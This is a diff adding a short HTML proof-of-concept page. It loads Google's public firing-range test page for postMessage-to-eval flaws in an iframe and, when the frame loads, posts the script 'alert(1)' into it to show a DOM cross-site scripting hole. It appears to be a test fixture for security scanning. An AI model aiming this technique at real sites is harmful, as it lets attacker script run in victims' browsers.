@@ -1,0 +1,20 @@
+<html>
+
+
+
+
+
+<body>
+    <iframe src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" id="frame" onload="sendMessage()">
+    </iframe>
+<script>
+
+    function sendMessage(nonce) {
+        document.getElementById('frame').contentWindow.postMessage("alert(1)","https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval");
+    }
+</script>
+
+
+<body>
+
+</html>
